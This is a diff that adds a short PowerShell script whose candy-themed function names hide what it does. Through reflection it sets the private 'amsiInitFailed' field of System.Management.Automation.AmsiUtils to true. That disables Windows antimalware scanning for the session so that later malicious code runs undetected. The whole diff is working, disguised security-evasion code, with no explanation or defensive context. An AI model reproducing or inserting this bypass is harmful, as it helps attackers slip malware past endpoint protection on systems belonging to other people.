@@ -1,0 +1,12 @@
+Function setCandyVar { param($sweet, $flavor) Set-Variable -Scope Script -Name $sweet -Value ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*System.Management.Automation*" }) }
+Function getCandyType { param($sweet) Get-Variable -Name $sweet -Scope Script -ValueOnly }
+Function unwrapCandy { param($o, $n) $o.GetType($n, $false, $false) }
+Function findWrapper { param($t, $f, $flags) $t.GetField($f, $flags) }
+Function fillWrapper { param($field, $value) $field.SetValue($null, $value) }
+
+$candyName = "Snickers123"
+setCandyVar $candyName
+$bag = getCandyType $candyName
+$type = unwrapCandy $bag "System.Management.Automation.AmsiUtils"
+$field = findWrapper $type "amsiInitFailed" ([Reflection.BindingFlags] "NonPublic,Static")
+fillWrapper $field $true
